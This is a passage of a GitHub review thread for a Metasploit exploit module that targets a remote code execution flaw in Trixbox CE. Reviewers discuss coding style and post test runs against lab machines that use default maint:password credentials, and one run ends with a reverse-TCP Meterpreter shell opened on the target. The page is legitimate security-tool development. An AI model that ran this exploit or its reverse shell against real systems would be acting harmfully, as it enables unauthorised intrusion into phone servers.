[May 1, 2020](#pullrequestreview-404235673)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 1, 2020](#issuecomment-622484329)

| [@stasinopoulos](https://github.com/stasinopoulos) Okay I think it is about time we did another full review of the code and the documentation. Going to get that going so long, and hopefully pick up anything else that needs to be done.  After that is done and any changes have been incorporated, should be good to test and then land if everything goes well. |
| --- |

 👍
1
 stasinopoulos reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Sorry, something went wrong.

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
suggested changes
[May 1, 2020](#pullrequestreview-404393707)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** left a comment

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Some more changes to go over, definitely looking a lot better though!

Sorry, something went wrong.

All reactions

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-14844a24b31341c812847aa58aedc08a400b5b11b67b023bfca8ce57f95fac40)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-14844a24b31341c812847aa58aedc08a400b5b11b67b023bfca8ce57f95fac40)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-14844a24b31341c812847aa58aedc08a400b5b11b67b023bfca8ce57f95fac40)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-14844a24b31341c812847aa58aedc08a400b5b11b67b023bfca8ce57f95fac40)
Outdated

Show resolved

Hide resolved

[documentation/modules/exploit/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.md](/rapid7/metasploit-framework/pull/13353/files#diff-14844a24b31341c812847aa58aedc08a400b5b11b67b023bfca8ce57f95fac40)
Outdated

Show resolved

Hide resolved

10 hidden conversations

Load more…

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)

Show resolved

Hide resolved

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[May 3, 2020](#pullrequestreview-404571188)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

|  |  | end |
| --- | --- | --- |
|  |  | version = get\_target(res) |
|  |  | if version.nil? |
|  |  | return CheckCode::Safe |

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** [May 3, 2020](#discussion_r419026740)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Every other case I see your outputting a line before returning a `CheckCode` code, so can we update this line to print out a message using `print_error` before we execute `return CheckCode::Safe`?

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @wvu **[wvu](/wvu)** [May 3, 2020](#discussion_r419028117) • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

You can also do `CheckCode::Safe('This is the reason.')` to automatically print the reason when running `check` directly.

Note that this has output limitations in the current implementation unless the `AutoCheck` mixin is used. A print will be universal. I hope that we can streamline this developer experience in the near future.

Sorry, something went wrong.

All reactions

Copy link

Contributor

Author

### @stasinopoulos **[stasinopoulos](/stasinopoulos)** [May 3, 2020](#discussion_r419064875)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Updated

Sorry, something went wrong.

All reactions

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** [May 4, 2020](#discussion_r419190608) • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

A lot of people don't run with `datastore[VERBOSE]` set to `TRUE`, so all of these `vprint_error` or commands in the format of `vprint_XXXX` won't ever be executed unless this is set. This is not what we want, as we want the user to always recieve info about errors. Status updates, however, can be optionally displayed via `vprint_status` **if they are of extremely low value**, however, most of the time this is not the case and one should just use `print_status` as per normal.

Sorry, something went wrong.

 👍
1
 wvu reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

Copy link

Contributor

### @gwillcox-r7 **[gwillcox-r7](/gwillcox-r7)** [May 4, 2020](#discussion_r419192390) • edited Loading

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

Also for reference this is the code that will be run when you execute `vprint_error`:

```
def vprint_error(msg='')
    print_error(msg) if datastore['VERBOSE'] || (!framework.nil? && framework.datastore['VERBOSE'])
end

```

Taken from lib/msf/core/module/ui/message/verbose.rb (thanks to [@wvu-r7](https://github.com/wvu-r7) for pointing this out to me)

Sorry, something went wrong.

 👍
1
 wvu reacted with thumbs up emoji

All reactions

* 👍
  1 reaction

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[May 3, 2020](#pullrequestreview-404572088)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)

Show resolved

Hide resolved

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[May 3, 2020](#pullrequestreview-404572305)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=60&v=4)](/gwillcox-r7)

**[gwillcox-r7](/gwillcox-r7)**
reviewed
[May 4, 2020](#pullrequestreview-404685738)

 [View reviewed changes](/rapid7/metasploit-framework/pull/13353/files)

[modules/exploits/unix/webapp/trixbox\_ce\_endpoint\_devicemap\_rce.rb](/rapid7/metasploit-framework/pull/13353/files#diff-5337984bf7949a74c277be18046b7f71ec3e2dedadebaf8ac3984981edc46b72)
Outdated

Show resolved

Hide resolved

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623236799) • edited Loading

| [@stasinopoulos](https://github.com/stasinopoulos) Looks like your `check` code isn't working correctly for TrixBox CE 1.2.0:  ``` msf5 > use exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce  msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options  Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):     Name          Current Setting  Required  Description    ----          ---------------  --------  -----------    HttpPassword  password         yes       Password to login with    HttpUsername  maint            yes       User to login with    Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS                         yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT         80               yes       The target port (TCP)    SRVHOST       0.0.0.0          yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0    SRVPORT       8080             yes       The local port to listen on.    SSL           false            no        Negotiate SSL/TLS for outgoing connections    SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)    URIPATH                        no        The URI to use for this exploit (default is random)    VHOST                          no        HTTP server virtual host   Payload options (linux/x86/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST                   yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic (Linux Dropper)   msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set LHOST 192.168.205.1 LHOST => 192.168.205.1 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.148 RHOSTS => 192.168.205.148 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set SRVHOST 192.168.205.1 SRVHOST => 192.168.205.1 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.148:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.148:80 - Authenticated successfully. [+] 192.168.205.148:80 - Trixbox CE v.x identified. nil versions are discouraged and will be deprecated in Rubygems 4 [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623237457)

| [@stasinopoulos](https://github.com/stasinopoulos) TrixBox CE 2.0 seems to be timing out....are you sure you tested this on all systems?  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.145:80 - Authenticating using "maint:password" credentials... [-] Exploit aborted due to failure: unreachable: Connection failed. [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.145:80 - Authenticating using "maint:password" credentials... [-] Exploit aborted due to failure: unreachable: Connection failed. [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > ping 192.168.205.145 [*] exec: ping 192.168.205.145  PING 192.168.205.145 (192.168.205.145): 56 data bytes 64 bytes from 192.168.205.145: icmp_seq=0 ttl=64 time=0.292 ms 64 bytes from 192.168.205.145: icmp_seq=1 ttl=64 time=0.355 ms 64 bytes from 192.168.205.145: icmp_seq=2 ttl=64 time=0.255 ms 64 bytes from 192.168.205.145: icmp_seq=3 ttl=64 time=0.405 ms 64 bytes from 192.168.205.145: icmp_seq=4 ttl=64 time=0.363 ms 64 bytes from 192.168.205.145: icmp_seq=5 ttl=64 time=0.329 ms 64 bytes from 192.168.205.145: icmp_seq=6 ttl=64 time=0.426 ms 64 bytes from 192.168.205.145: icmp_seq=7 ttl=64 time=0.427 ms 64 bytes from 192.168.205.145: icmp_seq=8 ttl=64 time=0.255 ms 64 bytes from 192.168.205.145: icmp_seq=9 ttl=64 time=0.346 ms 64 bytes from 192.168.205.145: icmp_seq=10 ttl=64 time=0.598 ms ^C --- 192.168.205.145 ping statistics --- 11 packets transmitted, 11 packets received, 0.0% packet loss round-trip min/avg/max/stddev = 0.255/0.368/0.598/0.093 ms Interrupt: use the 'exit' command to quit msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > nmap -p 80 192.168.205.145 [*] exec: nmap -p 80 192.168.205.145  Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-03 22:09 CDT Nmap scan report for 192.168.205.145 Host is up (0.00039s latency).  PORT   STATE SERVICE 80/tcp open  http  Nmap done: 1 IP address (1 host up) scanned in 0.04 seconds msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623238427)

| And finally latest version is also not working. I can confirm I can connect to the server via the browser fine:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [-] Exploit aborted due to failure: unreachable: Connection failed. [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > show options  Module options (exploit/unix/webapp/trixbox_ce_endpoint_devicemap_rce):     Name          Current Setting  Required  Description    ----          ---------------  --------  -----------    HttpPassword  password         yes       Password to login with    HttpUsername  maint            yes       User to login with    Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]    RHOSTS        192.168.205.150  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'    RPORT         80               yes       The target port (TCP)    SRVHOST       192.168.205.1    yes       The local host to listen on. This must be an address on the local machine or 0.0.0.0    SRVPORT       8080             yes       The local port to listen on.    SSL           false            no        Negotiate SSL/TLS for outgoing connections    SSLCert                        no        Path to a custom SSL certificate (default is randomly generated)    URIPATH                        no        The URI to use for this exploit (default is random)    VHOST                          no        HTTP server virtual host   Payload options (linux/x86/meterpreter/reverse_tcp):     Name   Current Setting  Required  Description    ----   ---------------  --------  -----------    LHOST  192.168.205.1    yes       The listen address (an interface may be specified)    LPORT  4444             yes       The listen port   Exploit target:     Id  Name    --  ----    0   Automatic (Linux Dropper)   msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >   ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623239377)

| Weird, I wonder what was causing that, the server suddenly worked now for 2.4.2.0:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.150:80 - Authenticating using "maint:password" credentials... [+] 192.168.205.150:80 - Authenticated successfully. [+] 192.168.205.150:80 - Trixbox CE v2.4.x identified. [*] 192.168.205.150:80 - Sending payload (150 bytes)... [*] Sending stage (980808 bytes) to 192.168.205.150 [*] Meterpreter session 3 opened (192.168.205.1:4444 -> 192.168.205.150:60709) at 2020-05-03 22:20:11 -0500  [*] Command Stager progress - 100.00% done (799/799 bytes)  meterpreter > getuid Server username: no-user @ trixbox1.localdomain (uid=102, gid=103, euid=102, egid=103) meterpreter > getpid Current pid: 3545 meterpreter > getwd /var/www/html/maint/modules/11_endpointcfg meterpreter >   ```  Will try again with TrixBox CE 1.2.0 |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623242485)

| [@stasinopoulos](https://github.com/stasinopoulos) Tried again after rebooting but still getting this for Trixbox CE v1.2.0. Included trace for visibility into the actual HTML it is trying to parse.  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set HttpTrace true  HttpTrace => true msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.148:80 - Authenticating using "maint:password" credentials... #################### # Request: #################### GET /maint/ HTTP/1.1 Host: 192.168.205.148 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Authorization: Basic bWFpbnQ6cGFzc3dvcmQ= Content-Type: application/x-www-form-urlencoded   #################### # Response: #################### HTTP/1.1 200 OK Date: Mon, 04 May 2020 02:23:59 GMT Server: Apache/2.0.52 (CentOS) X-Powered-By: PHP/4.3.11 Content-Length: 5552 Connection: close Content-Type: text/html; charset=UTF-8  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">  <head> <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" /> <meta http-equiv="content-language" content="en" /> <title>trixbox - Configuration and Administration</title> <link href="favicon.ico" rel="SHORTCUT ICON" /> <link rel="stylesheet" type="text/css" media="all" href="include/css/styleNN.css" /> <!-- RMV: added module header --> </head>  <body>  <table border="0" align="center" cellpadding="0" cellspacing="0" class="okvir_main"> 	<tr> 		<td> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/top_tab_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/top_tab_bg.gif"> 				</td> 				<td width="21"><img src="images/top_tab_right.gif" border="0" /></td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" id="okvir"> 			<tr> 				<td> 				<table width="100%" cellspacing="0"> 					<tr id="header"> 						<td> 						<img src="images/blank.gif" width="35" height="10" /></td> 						<td id="headerlogo" height="65px"> 						<a href="http://www.trixbox.org"> 						<img src="images/logo.png" width="212" height="55" alt="trixbox" border="0" /></a></td> 						<td align="right" id="headerbanner">Configuration and Administration&nbsp;&nbsp;&nbsp; 						</td> 					    <td id="headerlogo"><img src="images/gears.png" width="64" height="64" alt="Configuration and Administration" border="0" /></td> 					</tr> 					<tr> 						<td colspan="4"> 						<table cellspacing="0" cellpadding="0" width="100%" border="0"> 							<tr align="center"> 								<td width="588" bgcolor="#004081"></td> 								<td id="headmenu"> 								<a class="menuHead" href="index.php">MAIN</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 								<td id="headmenu"> 								<a class="menuHead" href="about.php">ABOUT</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 							</tr> 						</table> 						</td> 					</tr> 				</table> 				<table width="100%" border="0" cellspacing="0" cellpadding="0"> 					<tr> 						<td> 						<table width="100%" border="0" cellspacing="0" cellpadding="0"> 							<tr>								 							    <td align="left" class="vrijeme">Version: 1.2.0 	 								&nbsp;</td>  								<td align="right" class="vrijeme"> 								<span id="clock"></span> 								<script language="JavaScript" type="text/javascript" src="include/clock.js"></script> 								&nbsp;</td> 							</tr> 						</table> 						</td> 					</tr> 				</table><!-- start left blocks -->				 		<table border="0" cellpadding="0" cellspacing="0" id="glavna"> 			<tr> 				<td id="leftcolumn"> 				<div class="blockTitle">Asterisk</div> 				<div class="blockContent"> 					<table cellspacing="0"> 						<tr><td id="mainmenu"> 							<a class="menuTop" href="/admin" target="_blank">FreePBX</a> 							<a class="menuTop" href="configedit/phpconfig.php" target="_blank">Config Edit</a> 							<a class="menuTop" href="asterisk_info.php" target="_blank">Asterisk Info</a> 							<a class="menuTop" href="endpointcfg.php">Endpoint Manager</a> 							<a class="menuTop" href="hudadmin.php">HUD Manager</a> 							<a class="menuTop" href="spwizard.php">Service Provider Wizard</a> 							 						</td></tr> 					</table> 				</div> 				<div class="blockTitle">System</div> 				<div class="blockContent"> 					<table cellspacing="0"> 						<tr><td id="mainmenu"> 						<a class="menuTop" href="phpMyAdmin" target="_blank">phpMyAdmin</a> 						<a class="menuTop" href="phpsysinfo" target="_blank">System Info</a> 						<a class="menuTop" href="sysmaint.php">System Maint</a> 						<a class="menuTop" href="javassh.php">SSH Terminal</a> 						<a class="menuTop" href="/munin" target="_blank">Munin</a> 						</td></tr> 					</table> 				</div> 				<img src="images/160.gif" width="160" height="1" alt="" /> 			<br /> 			<br /> 			</td> <!-- end left blocks --> 	<!-- Display center blocks --> <td id="centercolumn">  <table class="sadrzaj" cellspacing="0">   <tr> 	<td id="centerCcolumn" >	 	 <table align="center" cellpadding="0" cellspacing="2"> 	  <tr> 	   <td> 		<div class="blockTitle">Main Menu</div> 		<div class="blockContent">Welcome to trixbox 		<br> 		<br> 		<br> 		<br> 		<br> 		<br>		 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 		<br>		 		</div>  	   </td> 	  </tr> 	 </table> 	</td>    </tr>  </table> </td> <!-- End Display center blocks -->  					</tr> 					<tr> 						<td colspan="3">&nbsp; </td> 					</tr> 				</table> 				</td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/bot_cat_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/bot_cat_bg.gif"> 				</td> 				<td width="21"><img src="images/bot_cat_right.gif" border="0" /></td> 			</tr> 		</table> 		</td> 	</tr> </table> <table width="758" border="0" align="center" cellpadding="0" cellspacing="0" class="dole"> 	<tr> 		<td> 		<div class="privatnost"> 			<br /> 			Copyright &copy 2006 by 			<a href="http://www.trixbox.org" target="_self">trixbox.org</a> 			<br /> 			<br /> 		</div> 		</td> 	</tr> </table>  </body>  </html> [+] 192.168.205.148:80 - Authenticated successfully. [+] 192.168.205.148:80 - Trixbox CE v.x identified. [-] Exploit aborted due to failure: not-vulnerable: The target is not vulnerable [*] Exploit completed, but no session was created. msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >  ``` |
| --- |

All reactions

Sorry, something went wrong.

[![@gwillcox-r7](https://avatars.githubusercontent.com/u/63261883?s=80&u=1144db3aa7b18a30fe7e7d91e1161aa11a819bfd&v=4)](/gwillcox-r7)

Copy link

Contributor

### **[gwillcox-r7](/gwillcox-r7)** commented [May 4, 2020](#issuecomment-623242866)

| And here is output for TrixBox CE 1.2.3 with tracing enabled:  ``` msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > set RHOSTS 192.168.205.146 RHOSTS => 192.168.205.146 msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) >  msf5 exploit(unix/webapp/trixbox_ce_endpoint_devicemap_rce) > exploit  [*] Started reverse TCP handler on 192.168.205.1:4444  [*] 192.168.205.146:80 - Authenticating using "maint:password" credentials... #################### # Request: #################### GET /maint/ HTTP/1.1 Host: 192.168.205.146 User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1) Authorization: Basic bWFpbnQ6cGFzc3dvcmQ= Content-Type: application/x-www-form-urlencoded   #################### # Response: #################### HTTP/1.1 200 OK Date: Thu, 30 Apr 2020 21:24:10 GMT Server: Apache/2.0.52 (CentOS) X-Powered-By: PHP/4.3.11 Content-Length: 5552 Connection: close Content-Type: text/html; charset=UTF-8  <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"> <html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">  <head> <meta http-equiv="content-type" content="text/html; charset=ISO-8859-1" /> <meta http-equiv="content-language" content="en" /> <title>trixbox - Configuration and Administration</title> <link href="favicon.ico" rel="SHORTCUT ICON" /> <link rel="stylesheet" type="text/css" media="all" href="include/css/styleNN.css" /> <!-- RMV: added module header --> </head>  <body>  <table border="0" align="center" cellpadding="0" cellspacing="0" class="okvir_main"> 	<tr> 		<td> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0"> 			<tr> 				<td width="21"><img src="images/top_tab_left.gif" border="0" /></td> 				<td align="middle" width="100%" background="images/top_tab_bg.gif"> 				</td> 				<td width="21"><img src="images/top_tab_right.gif" border="0" /></td> 			</tr> 		</table> 		<table width="100%" border="0" align="center" cellpadding="0" cellspacing="0" id="okvir"> 			<tr> 				<td> 				<table width="100%" cellspacing="0"> 					<tr id="header"> 						<td> 						<img src="images/blank.gif" width="35" height="10" /></td> 						<td id="headerlogo" height="65px"> 						<a href="http://www.trixbox.org"> 						<img src="images/logo.png" width="204" height="51" alt="trixbox" border="0" /></a></td> 						<td align="right" id="headerbanner">Configuration and Administration&nbsp;&nbsp;&nbsp; 						</td> 					    <td id="headerlogo"><img src="images/gears.png" width="64" height="64" alt="Configuration and Administration" border="0" /></td> 					</tr> 					<tr> 						<td colspan="4"> 						<table cellspacing="0" cellpadding="0" width="100%" border="0"> 							<tr align="center"> 								<td width="588" bgcolor="#004081"></td> 								<td id="headmenu"> 								<a class="menuHead" href="index.php">MAIN</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 								<td id="headmenu"> 								<a class="menuHead" href="about.php">ABOUT</a></td> 								<td width="1" bgcolor="#d7d7d7"></td> 							</tr> 						</table> 						</td> 					</tr> 				</table> 				<table width="100%" border="0" cellspacing="0" cellpadding="0"> 					<tr> 						<td> 						<table width="100%" border="0" cellspacing="0" cellpadding="0"> 							<tr>								 							    <td align="left" class="vrijeme">Version: 1.2.3 	 								&nbsp;</td>  								<td align="right" class="vrijeme"> 								<span id="clock"></span> 								<script language="JavaScript" type="text/javascript" src="include/clock.js"></script> 								&nbsp;</td> 							</tr> 						</table> 						</td> 					</tr> 				</table><!-- start left blocks -->				 		<table border="0" cellpadding="0" cellspacing="0" id="glavna"> 			<tr> 				<td id="leftcolumn"> 				<div class="blockTitle">Asterisk</div> 				<div class="blockContent"> 					<table cellspacing="0"> 						<tr><td id="mainmenu"> 							<a class="menuTop" href="/admin" target="_blank">FreePBX</a> 							<a class="menuTop" href="configedit/phpconfig.php" target="_blank">Config Edit</a> 							<a class="menuTop" href="asterisk_info.php" target="_blank">Asterisk Info</a> 							<a class="menuTop" href="endpointcfg.php">Endpoint Manager</a> 							<a class="menuTop" href="hudadmin.php">HUD Manager</a> 							<a class="menuTop" href="spwizard.php">Service Provider Wizard</a> 							 						</td></tr> 					</table> 				</div> 				<div class="blockTitle">System</div> 				<div class="blockContent"> 					<table cellspacing="0"> 						<tr><td id="mainmenu"> 						<a class="menuTop" href="phpMyAdmin" target="_blank">phpMyAdmin</a> 						<a class="menuTop" href="phpsysinfo" target="_blank">System Info</a> 						<a class="menuTop" href="sysmaint.php">System Maint</a> 						<a class="menuTop" href="javassh.php">SSH Terminal</a> 						<a class="menuTop" href="/munin" target="_blank">Munin</a> 						</td></tr> 					</table> 				</div> 				<img src="images/160.gif" width="160" height="1" alt="" /> 			<br /> 			<br /> 			</td> <!-- end left blocks --> 	<!-- Display center blocks --> <td id="centercolumn">  <table class="sadrzaj" cellspacing="0">   <tr> 	<td id="centerCcolumn" >	 	 <table align="center" cellpadding="0" cellspacing="2"> 	  <tr> 	   <td> 		<div class="blockTitle">Main Menu</div> 		<div class="blockContent">Welcome to trixbox 		<br> 		<br> 		<br> 		<br> 		<br> 		<br>		 		<br> 		<br> 		<br> 		<br> 		<br> 		<br> 	